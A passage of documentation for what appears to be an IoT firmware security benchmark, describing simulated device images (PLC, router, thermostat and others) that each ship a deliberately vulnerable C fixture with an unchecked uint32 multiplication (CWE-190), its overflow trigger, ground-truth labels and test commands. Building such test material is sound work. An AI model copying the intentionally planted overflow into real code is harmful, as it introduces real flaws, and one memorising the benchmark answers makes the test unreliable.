`validation-console.log`. The shared procedures above describe architecture
selection, exact outputs, distinction from other CWEs and diagnostic limits.

### Integer Overflow — plc

Simulated device category: **industrial PLC gateway (OT)**, reusing
`meta-iotbench/recipes-devices/plc/`. Firmware directory:
`deploy-images/plc-cwe190-integer-overflow/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-plc-cwe190-integer-overflow.bb`.
Default rootfs: `iotbench-plc-cwe190-integer-overflow-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` beside it. Sole vulnerability package:
`cwe190-integer-overflow`; the existing device services/peripherals remain.

Native executable: **`/usr/bin/fixture-batch-size`**. Matching C source:
`meta-iotbench/recipes-vulns/cwe190-integer-overflow/files/fixture-batch-size.c`,
also installed as `/usr/share/iotbench/integer-overflow/fixture-batch-size.c`.
Purpose: a harmless local estimate of a batch of synthetic process telemetry records.
The input is one unsigned decimal record count in `argv[1]`, converted with
`strtoumax` at **line 24**, checked for valid syntax and `uint32_t` range at
lines 15–28, and stored in **`uint32_t record_count`**.

Fixed operands are **`uint32_t record_size = 1024`** bytes and
**`uint32_t max_capacity = 4096`** bytes. The exact vulnerable operation is
**`record_count * record_size` in `calculate_total`, source line 35**.
Its result is stored in **`uint32_t total_size` at line 51**.
Multiplication-bound validation is intentionally missing before line 35;
no check of `record_count <= UINT32_MAX / record_size` protects that operation.
Maximum representable value: **4294967295**. Normal input **`2`** gives
mathematical/stored result **2048** and an accepted batch, status 0.
Overflow input **`4194304`** gives mathematical result **4294967296** but
stored result **0**. The capacity comparison at **line 56** uses that wrong
value and incorrectly prints **`Synthetic batch accepted`**, status 0.
No memory allocation, copying or indexing uses the result.

Representative vulnerable flow and expected static-analysis data flow:
`input "4194304"` → `record_count = 4194304` → `record_count * 1024`
→ `mathematical result = 4294967296` → `uint32_t result wraps to 0`
→ `synthetic capacity comparison uses incorrect value` → incorrect acceptance.
Expected finding: an external numeric argument reaches unchecked fixed-width
multiplication and a capacity decision using its wrapped result.
Exact ground-truth label: **Vulnerable C Binaries — Integer Overflow**.
Corresponding classification: **CWE-190: Integer Overflow or Wraparound**.
Safe remediation: for nonzero `record_size`, check
`record_count <= UINT32_MAX / record_size` before multiplication and reject
unrepresentable results; alternatively use appropriate checked arithmetic or
a sufficient wider calculation and validate downstream use. Keep this fixture's
arithmetic path intentionally vulnerable.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=plc-cwe190-integer-overflow docker compose run --rm yocto
FIRMWARE=plc-cwe190-integer-overflow ./scripts/run-qemu.sh
~~~

Local tests inside this guest's serial console:

~~~sh
fixture-batch-size 2
fixture-batch-size 4194304
sh /usr/share/iotbench/integer-overflow/test-guest.sh plc
~~~

Expected: exact normal/overflow output shown above, then six regression `PASS`
lines and status 0. The regression executes every calculation as UID/GID 65534.
Automatic disposable runtime check (host, separately from manual QEMU):

~~~bash
python3 scripts/test-integer-overflow.py --device plc
~~~

Offline verification (host, existing aarch64 builder tools):

~~~bash
docker compose run --rm yocto python3 /scripts/test-integer-overflow.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/plc-cwe190-integer-overflow/qemuarm64/iotbench-plc-cwe190-integer-overflow-qemuarm64.rootfs.ext4.zst
~~~

The shared `python3 scripts/test-integer-overflow.py --local --sanitize` check
verifies the host build and exact unsigned-overflow diagnostic at line 35;
its safe control is temporary. **Verified 2026-10-16 on qemuarm64:** actual
build/export, offline native multiplication/source/profile checks, and all six
QEMU guest assertion groups passed, including normal 2048 and overflowed 0 with
incorrect acceptance. Other architectures were not built or boot-tested.
The completed-validation section describes diagnostic limits. Evidence is saved in
`deploy-images/plc-cwe190-integer-overflow/qemuarm64/` as `build.log`,
`rootfs.manifest`, `validation-offline.log`, `validation-runtime.log` and
`validation-console.log`. The shared procedures above describe architecture
selection, exact outputs, distinction from other CWEs and diagnostic limits.

### Integer Overflow — router

Simulated device category: **network router / gateway**, reusing
`meta-iotbench/recipes-devices/router/`. Firmware directory:
`deploy-images/router-cwe190-integer-overflow/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-router-cwe190-integer-overflow.bb`.
Default rootfs: `iotbench-router-cwe190-integer-overflow-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` beside it. Sole vulnerability package:
`cwe190-integer-overflow`; the existing device services/peripherals remain.

Native executable: **`/usr/bin/fixture-batch-size`**. Matching C source:
`meta-iotbench/recipes-vulns/cwe190-integer-overflow/files/fixture-batch-size.c`,
also installed as `/usr/share/iotbench/integer-overflow/fixture-batch-size.c`.
Purpose: a harmless local estimate of a batch of synthetic network telemetry records.
The input is one unsigned decimal record count in `argv[1]`, converted with
`strtoumax` at **line 24**, checked for valid syntax and `uint32_t` range at
lines 15–28, and stored in **`uint32_t record_count`**.

Fixed operands are **`uint32_t record_size = 1024`** bytes and
**`uint32_t max_capacity = 4096`** bytes. The exact vulnerable operation is
**`record_count * record_size` in `calculate_total`, source line 35**.
Its result is stored in **`uint32_t total_size` at line 51**.
Multiplication-bound validation is intentionally missing before line 35;
no check of `record_count <= UINT32_MAX / record_size` protects that operation.
Maximum representable value: **4294967295**. Normal input **`2`** gives
mathematical/stored result **2048** and an accepted batch, status 0.
Overflow input **`4194304`** gives mathematical result **4294967296** but
stored result **0**. The capacity comparison at **line 56** uses that wrong
value and incorrectly prints **`Synthetic batch accepted`**, status 0.
No memory allocation, copying or indexing uses the result.

Representative vulnerable flow and expected static-analysis data flow:
`input "4194304"` → `record_count = 4194304` → `record_count * 1024`
→ `mathematical result = 4294967296` → `uint32_t result wraps to 0`
→ `synthetic capacity comparison uses incorrect value` → incorrect acceptance.
Expected finding: an external numeric argument reaches unchecked fixed-width
multiplication and a capacity decision using its wrapped result.
Exact ground-truth label: **Vulnerable C Binaries — Integer Overflow**.
Corresponding classification: **CWE-190: Integer Overflow or Wraparound**.
Safe remediation: for nonzero `record_size`, check
`record_count <= UINT32_MAX / record_size` before multiplication and reject
unrepresentable results; alternatively use appropriate checked arithmetic or
a sufficient wider calculation and validate downstream use. Keep this fixture's
arithmetic path intentionally vulnerable.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=router-cwe190-integer-overflow docker compose run --rm yocto
FIRMWARE=router-cwe190-integer-overflow ./scripts/run-qemu.sh
~~~

Local tests inside this guest's serial console:

~~~sh
fixture-batch-size 2
fixture-batch-size 4194304
sh /usr/share/iotbench/integer-overflow/test-guest.sh router
~~~

Expected: exact normal/overflow output shown above, then six regression `PASS`
lines and status 0. The regression executes every calculation as UID/GID 65534.
Automatic disposable runtime check (host, separately from manual QEMU):

~~~bash
python3 scripts/test-integer-overflow.py --device router
~~~

Offline verification (host, existing aarch64 builder tools):

~~~bash
docker compose run --rm yocto python3 /scripts/test-integer-overflow.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/router-cwe190-integer-overflow/qemuarm64/iotbench-router-cwe190-integer-overflow-qemuarm64.rootfs.ext4.zst
~~~

The shared `python3 scripts/test-integer-overflow.py --local --sanitize` check
verifies the host build and exact unsigned-overflow diagnostic at line 35;
its safe control is temporary. **Verified 2026-10-16 on qemuarm64:** actual
build/export, offline native multiplication/source/profile checks, and all six
QEMU guest assertion groups passed, including normal 2048 and overflowed 0 with
incorrect acceptance. Other architectures were not built or boot-tested.
The completed-validation section describes diagnostic limits. Evidence is saved in
`deploy-images/router-cwe190-integer-overflow/qemuarm64/` as `build.log`,
`rootfs.manifest`, `validation-offline.log`, `validation-runtime.log` and
`validation-console.log`. The shared procedures above describe architecture
selection, exact outputs, distinction from other CWEs and diagnostic limits.

### Integer Overflow — smartbulb

Simulated device category: **lighting / smart bulb**, reusing
`meta-iotbench/recipes-devices/smartbulb/`. Firmware directory:
`deploy-images/smartbulb-cwe190-integer-overflow/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-smartbulb-cwe190-integer-overflow.bb`.
Default rootfs: `iotbench-smartbulb-cwe190-integer-overflow-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` beside it. Sole vulnerability package:
`cwe190-integer-overflow`; the existing device services/peripherals remain.

Native executable: **`/usr/bin/fixture-batch-size`**. Matching C source:
`meta-iotbench/recipes-vulns/cwe190-integer-overflow/files/fixture-batch-size.c`,
also installed as `/usr/share/iotbench/integer-overflow/fixture-batch-size.c`.
Purpose: a harmless local estimate of a batch of synthetic lighting telemetry records.
The input is one unsigned decimal record count in `argv[1]`, converted with
`strtoumax` at **line 24**, checked for valid syntax and `uint32_t` range at
lines 15–28, and stored in **`uint32_t record_count`**.

Fixed operands are **`uint32_t record_size = 1024`** bytes and
**`uint32_t max_capacity = 4096`** bytes. The exact vulnerable operation is
**`record_count * record_size` in `calculate_total`, source line 35**.
Its result is stored in **`uint32_t total_size` at line 51**.
Multiplication-bound validation is intentionally missing before line 35;
no check of `record_count <= UINT32_MAX / record_size` protects that operation.
Maximum representable value: **4294967295**. Normal input **`2`** gives
mathematical/stored result **2048** and an accepted batch, status 0.
Overflow input **`4194304`** gives mathematical result **4294967296** but
stored result **0**. The capacity comparison at **line 56** uses that wrong
value and incorrectly prints **`Synthetic batch accepted`**, status 0.
No memory allocation, copying or indexing uses the result.

Representative vulnerable flow and expected static-analysis data flow:
`input "4194304"` → `record_count = 4194304` → `record_count * 1024`
→ `mathematical result = 4294967296` → `uint32_t result wraps to 0`
→ `synthetic capacity comparison uses incorrect value` → incorrect acceptance.
Expected finding: an external numeric argument reaches unchecked fixed-width
multiplication and a capacity decision using its wrapped result.
Exact ground-truth label: **Vulnerable C Binaries — Integer Overflow**.
Corresponding classification: **CWE-190: Integer Overflow or Wraparound**.
Safe remediation: for nonzero `record_size`, check
`record_count <= UINT32_MAX / record_size` before multiplication and reject
unrepresentable results; alternatively use appropriate checked arithmetic or
a sufficient wider calculation and validate downstream use. Keep this fixture's
arithmetic path intentionally vulnerable.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=smartbulb-cwe190-integer-overflow docker compose run --rm yocto
FIRMWARE=smartbulb-cwe190-integer-overflow ./scripts/run-qemu.sh
~~~

Local tests inside this guest's serial console:

~~~sh
fixture-batch-size 2
fixture-batch-size 4194304
sh /usr/share/iotbench/integer-overflow/test-guest.sh smartbulb
~~~

Expected: exact normal/overflow output shown above, then six regression `PASS`
lines and status 0. The regression executes every calculation as UID/GID 65534.
Automatic disposable runtime check (host, separately from manual QEMU):

~~~bash
python3 scripts/test-integer-overflow.py --device smartbulb
~~~

Offline verification (host, existing aarch64 builder tools):

~~~bash
docker compose run --rm yocto python3 /scripts/test-integer-overflow.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/smartbulb-cwe190-integer-overflow/qemuarm64/iotbench-smartbulb-cwe190-integer-overflow-qemuarm64.rootfs.ext4.zst
~~~

The shared `python3 scripts/test-integer-overflow.py --local --sanitize` check
verifies the host build and exact unsigned-overflow diagnostic at line 35;
its safe control is temporary. **Verified 2026-10-16 on qemuarm64:** actual
build/export, offline native multiplication/source/profile checks, and all six
QEMU guest assertion groups passed, including normal 2048 and overflowed 0 with
incorrect acceptance. Other architectures were not built or boot-tested.
The completed-validation section describes diagnostic limits. Evidence is saved in
`deploy-images/smartbulb-cwe190-integer-overflow/qemuarm64/` as `build.log`,
`rootfs.manifest`, `validation-offline.log`, `validation-runtime.log` and
`validation-console.log`. The shared procedures above describe architecture
selection, exact outputs, distinction from other CWEs and diagnostic limits.

### Integer Overflow — smarthub

Simulated device category: **controller / smart hub**, reusing
`meta-iotbench/recipes-devices/smarthub/`. Firmware directory:
`deploy-images/smarthub-cwe190-integer-overflow/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-smarthub-cwe190-integer-overflow.bb`.
Default rootfs: `iotbench-smarthub-cwe190-integer-overflow-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` beside it. Sole vulnerability package:
`cwe190-integer-overflow`; the existing device services/peripherals remain.

Native executable: **`/usr/bin/fixture-batch-size`**. Matching C source:
`meta-iotbench/recipes-vulns/cwe190-integer-overflow/files/fixture-batch-size.c`,
also installed as `/usr/share/iotbench/integer-overflow/fixture-batch-size.c`.
Purpose: a harmless local estimate of a batch of synthetic hub telemetry records.
The input is one unsigned decimal record count in `argv[1]`, converted with
`strtoumax` at **line 24**, checked for valid syntax and `uint32_t` range at
lines 15–28, and stored in **`uint32_t record_count`**.

Fixed operands are **`uint32_t record_size = 1024`** bytes and
**`uint32_t max_capacity = 4096`** bytes. The exact vulnerable operation is
**`record_count * record_size` in `calculate_total`, source line 35**.
Its result is stored in **`uint32_t total_size` at line 51**.
Multiplication-bound validation is intentionally missing before line 35;
no check of `record_count <= UINT32_MAX / record_size` protects that operation.
Maximum representable value: **4294967295**. Normal input **`2`** gives
mathematical/stored result **2048** and an accepted batch, status 0.
Overflow input **`4194304`** gives mathematical result **4294967296** but
stored result **0**. The capacity comparison at **line 56** uses that wrong
value and incorrectly prints **`Synthetic batch accepted`**, status 0.
No memory allocation, copying or indexing uses the result.

Representative vulnerable flow and expected static-analysis data flow:
`input "4194304"` → `record_count = 4194304` → `record_count * 1024`
→ `mathematical result = 4294967296` → `uint32_t result wraps to 0`
→ `synthetic capacity comparison uses incorrect value` → incorrect acceptance.
Expected finding: an external numeric argument reaches unchecked fixed-width
multiplication and a capacity decision using its wrapped result.
Exact ground-truth label: **Vulnerable C Binaries — Integer Overflow**.
Corresponding classification: **CWE-190: Integer Overflow or Wraparound**.
Safe remediation: for nonzero `record_size`, check
`record_count <= UINT32_MAX / record_size` before multiplication and reject
unrepresentable results; alternatively use appropriate checked arithmetic or
a sufficient wider calculation and validate downstream use. Keep this fixture's
arithmetic path intentionally vulnerable.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=smarthub-cwe190-integer-overflow docker compose run --rm yocto
FIRMWARE=smarthub-cwe190-integer-overflow ./scripts/run-qemu.sh
~~~

Local tests inside this guest's serial console:

~~~sh
fixture-batch-size 2
fixture-batch-size 4194304
sh /usr/share/iotbench/integer-overflow/test-guest.sh smarthub
~~~

Expected: exact normal/overflow output shown above, then six regression `PASS`
lines and status 0. The regression executes every calculation as UID/GID 65534.
Automatic disposable runtime check (host, separately from manual QEMU):

~~~bash
python3 scripts/test-integer-overflow.py --device smarthub
~~~

Offline verification (host, existing aarch64 builder tools):

~~~bash
docker compose run --rm yocto python3 /scripts/test-integer-overflow.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/smarthub-cwe190-integer-overflow/qemuarm64/iotbench-smarthub-cwe190-integer-overflow-qemuarm64.rootfs.ext4.zst
~~~

The shared `python3 scripts/test-integer-overflow.py --local --sanitize` check
verifies the host build and exact unsigned-overflow diagnostic at line 35;
its safe control is temporary. **Verified 2026-10-16 on qemuarm64:** actual
build/export, offline native multiplication/source/profile checks, and all six
QEMU guest assertion groups passed, including normal 2048 and overflowed 0 with
incorrect acceptance. Other architectures were not built or boot-tested.
The completed-validation section describes diagnostic limits. Evidence is saved in
`deploy-images/smarthub-cwe190-integer-overflow/qemuarm64/` as `build.log`,
`rootfs.manifest`, `validation-offline.log`, `validation-runtime.log` and
`validation-console.log`. The shared procedures above describe architecture
selection, exact outputs, distinction from other CWEs and diagnostic limits.

### Integer Overflow — smartplug

Simulated device category: **energy-management smart plug**, reusing
`meta-iotbench/recipes-devices/smartplug/`. Firmware directory:
`deploy-images/smartplug-cwe190-integer-overflow/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-smartplug-cwe190-integer-overflow.bb`.
Default rootfs: `iotbench-smartplug-cwe190-integer-overflow-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` beside it. Sole vulnerability package:
`cwe190-integer-overflow`; the existing device services/peripherals remain.

Native executable: **`/usr/bin/fixture-batch-size`**. Matching C source:
`meta-iotbench/recipes-vulns/cwe190-integer-overflow/files/fixture-batch-size.c`,
also installed as `/usr/share/iotbench/integer-overflow/fixture-batch-size.c`.
Purpose: a harmless local estimate of a batch of synthetic power telemetry records.
The input is one unsigned decimal record count in `argv[1]`, converted with
`strtoumax` at **line 24**, checked for valid syntax and `uint32_t` range at
lines 15–28, and stored in **`uint32_t record_count`**.

Fixed operands are **`uint32_t record_size = 1024`** bytes and
**`uint32_t max_capacity = 4096`** bytes. The exact vulnerable operation is
**`record_count * record_size` in `calculate_total`, source line 35**.
Its result is stored in **`uint32_t total_size` at line 51**.
Multiplication-bound validation is intentionally missing before line 35;
no check of `record_count <= UINT32_MAX / record_size` protects that operation.
Maximum representable value: **4294967295**. Normal input **`2`** gives
mathematical/stored result **2048** and an accepted batch, status 0.
Overflow input **`4194304`** gives mathematical result **4294967296** but
stored result **0**. The capacity comparison at **line 56** uses that wrong
value and incorrectly prints **`Synthetic batch accepted`**, status 0.
No memory allocation, copying or indexing uses the result.

Representative vulnerable flow and expected static-analysis data flow:
`input "4194304"` → `record_count = 4194304` → `record_count * 1024`
→ `mathematical result = 4294967296` → `uint32_t result wraps to 0`
→ `synthetic capacity comparison uses incorrect value` → incorrect acceptance.
Expected finding: an external numeric argument reaches unchecked fixed-width
multiplication and a capacity decision using its wrapped result.
Exact ground-truth label: **Vulnerable C Binaries — Integer Overflow**.
Corresponding classification: **CWE-190: Integer Overflow or Wraparound**.
Safe remediation: for nonzero `record_size`, check
`record_count <= UINT32_MAX / record_size` before multiplication and reject
unrepresentable results; alternatively use appropriate checked arithmetic or
a sufficient wider calculation and validate downstream use. Keep this fixture's
arithmetic path intentionally vulnerable.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=smartplug-cwe190-integer-overflow docker compose run --rm yocto
FIRMWARE=smartplug-cwe190-integer-overflow ./scripts/run-qemu.sh
~~~

Local tests inside this guest's serial console:

~~~sh
fixture-batch-size 2
fixture-batch-size 4194304
sh /usr/share/iotbench/integer-overflow/test-guest.sh smartplug
~~~

Expected: exact normal/overflow output shown above, then six regression `PASS`
lines and status 0. The regression executes every calculation as UID/GID 65534.
Automatic disposable runtime check (host, separately from manual QEMU):

~~~bash
python3 scripts/test-integer-overflow.py --device smartplug
~~~

Offline verification (host, existing aarch64 builder tools):

~~~bash
docker compose run --rm yocto python3 /scripts/test-integer-overflow.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/smartplug-cwe190-integer-overflow/qemuarm64/iotbench-smartplug-cwe190-integer-overflow-qemuarm64.rootfs.ext4.zst
~~~

The shared `python3 scripts/test-integer-overflow.py --local --sanitize` check
verifies the host build and exact unsigned-overflow diagnostic at line 35;
its safe control is temporary. **Verified 2026-10-16 on qemuarm64:** actual
build/export, offline native multiplication/source/profile checks, and all six
QEMU guest assertion groups passed, including normal 2048 and overflowed 0 with
incorrect acceptance. Other architectures were not built or boot-tested.
The completed-validation section describes diagnostic limits. Evidence is saved in
`deploy-images/smartplug-cwe190-integer-overflow/qemuarm64/` as `build.log`,
`rootfs.manifest`, `validation-offline.log`, `validation-runtime.log` and
`validation-console.log`. The shared procedures above describe architecture
selection, exact outputs, distinction from other CWEs and diagnostic limits.

### Integer Overflow — smartspeaker

Simulated device category: **audio / voice-assistant speaker**, reusing
`meta-iotbench/recipes-devices/smartspeaker/`. Firmware directory:
`deploy-images/smartspeaker-cwe190-integer-overflow/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-smartspeaker-cwe190-integer-overflow.bb`.
Default rootfs: `iotbench-smartspeaker-cwe190-integer-overflow-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` beside it. Sole vulnerability package:
`cwe190-integer-overflow`; the existing device services/peripherals remain.

Native executable: **`/usr/bin/fixture-batch-size`**. Matching C source:
`meta-iotbench/recipes-vulns/cwe190-integer-overflow/files/fixture-batch-size.c`,
also installed as `/usr/share/iotbench/integer-overflow/fixture-batch-size.c`.
Purpose: a harmless local estimate of a batch of synthetic audio status records.
The input is one unsigned decimal record count in `argv[1]`, converted with
`strtoumax` at **line 24**, checked for valid syntax and `uint32_t` range at
lines 15–28, and stored in **`uint32_t record_count`**.

Fixed operands are **`uint32_t record_size = 1024`** bytes and
**`uint32_t max_capacity = 4096`** bytes. The exact vulnerable operation is
**`record_count * record_size` in `calculate_total`, source line 35**.
Its result is stored in **`uint32_t total_size` at line 51**.
Multiplication-bound validation is intentionally missing before line 35;
no check of `record_count <= UINT32_MAX / record_size` protects that operation.
Maximum representable value: **4294967295**. Normal input **`2`** gives
mathematical/stored result **2048** and an accepted batch, status 0.
Overflow input **`4194304`** gives mathematical result **4294967296** but
stored result **0**. The capacity comparison at **line 56** uses that wrong
value and incorrectly prints **`Synthetic batch accepted`**, status 0.
No memory allocation, copying or indexing uses the result.

Representative vulnerable flow and expected static-analysis data flow:
`input "4194304"` → `record_count = 4194304` → `record_count * 1024`
→ `mathematical result = 4294967296` → `uint32_t result wraps to 0`
→ `synthetic capacity comparison uses incorrect value` → incorrect acceptance.
Expected finding: an external numeric argument reaches unchecked fixed-width
multiplication and a capacity decision using its wrapped result.
Exact ground-truth label: **Vulnerable C Binaries — Integer Overflow**.
Corresponding classification: **CWE-190: Integer Overflow or Wraparound**.
Safe remediation: for nonzero `record_size`, check
`record_count <= UINT32_MAX / record_size` before multiplication and reject
unrepresentable results; alternatively use appropriate checked arithmetic or
a sufficient wider calculation and validate downstream use. Keep this fixture's
arithmetic path intentionally vulnerable.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=smartspeaker-cwe190-integer-overflow docker compose run --rm yocto
FIRMWARE=smartspeaker-cwe190-integer-overflow ./scripts/run-qemu.sh
~~~

Local tests inside this guest's serial console:

~~~sh
fixture-batch-size 2
fixture-batch-size 4194304
sh /usr/share/iotbench/integer-overflow/test-guest.sh smartspeaker
~~~

Expected: exact normal/overflow output shown above, then six regression `PASS`
lines and status 0. The regression executes every calculation as UID/GID 65534.
Automatic disposable runtime check (host, separately from manual QEMU):

~~~bash
python3 scripts/test-integer-overflow.py --device smartspeaker
~~~

Offline verification (host, existing aarch64 builder tools):

~~~bash
docker compose run --rm yocto python3 /scripts/test-integer-overflow.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/smartspeaker-cwe190-integer-overflow/qemuarm64/iotbench-smartspeaker-cwe190-integer-overflow-qemuarm64.rootfs.ext4.zst
~~~

The shared `python3 scripts/test-integer-overflow.py --local --sanitize` check
verifies the host build and exact unsigned-overflow diagnostic at line 35;
its safe control is temporary. **Verified 2026-10-16 on qemuarm64:** actual
build/export, offline native multiplication/source/profile checks, and all six
QEMU guest assertion groups passed, including normal 2048 and overflowed 0 with
incorrect acceptance. Other architectures were not built or boot-tested.
The completed-validation section describes diagnostic limits. Evidence is saved in
`deploy-images/smartspeaker-cwe190-integer-overflow/qemuarm64/` as `build.log`,
`rootfs.manifest`, `validation-offline.log`, `validation-runtime.log` and
`validation-console.log`. The shared procedures above describe architecture
selection, exact outputs, distinction from other CWEs and diagnostic limits.

### Integer Overflow — thermostat

Simulated device category: **climate-control thermostat**, reusing
`meta-iotbench/recipes-devices/thermostat/`. Firmware directory:
`deploy-images/thermostat-cwe190-integer-overflow/<machine>/`. Image recipe:
`meta-iotbench/recipes-images/iotbench-thermostat-cwe190-integer-overflow.bb`.
Default rootfs: `iotbench-thermostat-cwe190-integer-overflow-qemuarm64.rootfs.ext4.zst`,
with kernel `Image` beside it. Sole vulnerability package:
`cwe190-integer-overflow`; the existing device services/peripherals remain.

Native executable: **`/usr/bin/fixture-batch-size`**. Matching C source:
`meta-iotbench/recipes-vulns/cwe190-integer-overflow/files/fixture-batch-size.c`,
also installed as `/usr/share/iotbench/integer-overflow/fixture-batch-size.c`.
Purpose: a harmless local estimate of a batch of synthetic climate telemetry records.
The input is one unsigned decimal record count in `argv[1]`, converted with
`strtoumax` at **line 24**, checked for valid syntax and `uint32_t` range at
lines 15–28, and stored in **`uint32_t record_count`**.

Fixed operands are **`uint32_t record_size = 1024`** bytes and
**`uint32_t max_capacity = 4096`** bytes. The exact vulnerable operation is
**`record_count * record_size` in `calculate_total`, source line 35**.
Its result is stored in **`uint32_t total_size` at line 51**.
Multiplication-bound validation is intentionally missing before line 35;
no check of `record_count <= UINT32_MAX / record_size` protects that operation.
Maximum representable value: **4294967295**. Normal input **`2`** gives
mathematical/stored result **2048** and an accepted batch, status 0.
Overflow input **`4194304`** gives mathematical result **4294967296** but
stored result **0**. The capacity comparison at **line 56** uses that wrong
value and incorrectly prints **`Synthetic batch accepted`**, status 0.
No memory allocation, copying or indexing uses the result.

Representative vulnerable flow and expected static-analysis data flow:
`input "4194304"` → `record_count = 4194304` → `record_count * 1024`
→ `mathematical result = 4294967296` → `uint32_t result wraps to 0`
→ `synthetic capacity comparison uses incorrect value` → incorrect acceptance.
Expected finding: an external numeric argument reaches unchecked fixed-width
multiplication and a capacity decision using its wrapped result.
Exact ground-truth label: **Vulnerable C Binaries — Integer Overflow**.
Corresponding classification: **CWE-190: Integer Overflow or Wraparound**.
Safe remediation: for nonzero `record_size`, check
`record_count <= UINT32_MAX / record_size` before multiplication and reject
unrepresentable results; alternatively use appropriate checked arithmetic or
a sufficient wider calculation and validate downstream use. Keep this fixture's
arithmetic path intentionally vulnerable.

Local build and manual boot (host repository root):

~~~bash
FIRMWARE=thermostat-cwe190-integer-overflow docker compose run --rm yocto
FIRMWARE=thermostat-cwe190-integer-overflow ./scripts/run-qemu.sh
~~~

Local tests inside this guest's serial console:

~~~sh
fixture-batch-size 2
fixture-batch-size 4194304
sh /usr/share/iotbench/integer-overflow/test-guest.sh thermostat
~~~

Expected: exact normal/overflow output shown above, then six regression `PASS`
lines and status 0. The regression executes every calculation as UID/GID 65534.
Automatic disposable runtime check (host, separately from manual QEMU):

~~~bash
python3 scripts/test-integer-overflow.py --device thermostat
~~~

Offline verification (host, existing aarch64 builder tools):

~~~bash
docker compose run --rm yocto python3 /scripts/test-integer-overflow.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/thermostat-cwe190-integer-overflow/qemuarm64/iotbench-thermostat-cwe190-integer-overflow-qemuarm64.rootfs.ext4.zst
~~~

The shared `python3 scripts/test-integer-overflow.py --local --sanitize` check
verifies the host build and exact unsigned-overflow diagnostic at line 35;
its safe control is temporary. **Verified 2026-10-16 on qemuarm64:** actual
build/export, offline native multiplication/source/profile checks, and all six
QEMU guest assertion groups passed, including normal 2048 and overflowed 0 with
incorrect acceptance. Other architectures were not built or boot-tested.
The completed-validation section describes diagnostic limits. Evidence is saved in
`deploy-images/thermostat-cwe190-integer-overflow/qemuarm64/` as `build.log`,
`rootfs.manifest`, `validation-offline.log`, `validation-runtime.log` and
`validation-console.log`. The shared procedures above describe architecture
selection, exact outputs, distinction from other CWEs and diagnostic limits.
